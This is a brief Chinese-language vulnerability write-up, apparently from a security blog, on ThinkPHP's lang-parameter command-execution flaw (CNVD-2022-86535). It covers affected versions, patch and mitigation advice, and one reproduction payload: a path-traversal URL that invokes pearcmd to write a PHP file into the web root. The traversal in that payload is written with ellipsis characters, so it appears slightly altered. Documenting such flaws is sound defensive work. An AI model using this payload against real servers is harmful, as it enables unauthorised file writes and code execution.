---
title: "ThinkPHP 命令执行漏洞 CNVD-2022-86535"
date: 2026-10-13 09:02:32
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "ThinkPHP"
tags:
  - "ThinkPHP"
  - "命令执行"
  - "CNVD-2022-86535"
  - "漏洞复现"
---
## 漏洞描述

该漏洞是由于 Thinkphp 开启了多语言功能，并且对参数 lang 传参过滤不严谨，导致攻击者可利用该漏洞执行命令。

## 漏洞影响

```
ThinkPHP >=V6.0.1，<=V6.0.13
ThinkPHP >=V5.0.X，<=V5.1.X
```

## 漏洞复现

payload：

```
/index?lang=…/…/…/…/…/…/…/…/usr/local/lib/php/pearcmd&+config-create+/&/+/var/www/html/test.php
```

## 漏洞修复

官方已发布漏洞补丁及修复版本，可以评估业务是否受影响后，酌情升级至安全版本。

如不需要多语言功能，请及时关闭此功能，可参考官方文档：

- https://www.kancloud.cn/manual/thinkphp6_0/1037637
- https://static.kancloud.cn/manual/thinkphp5/118132

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/ThinkPHP-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-2022-86535.md)
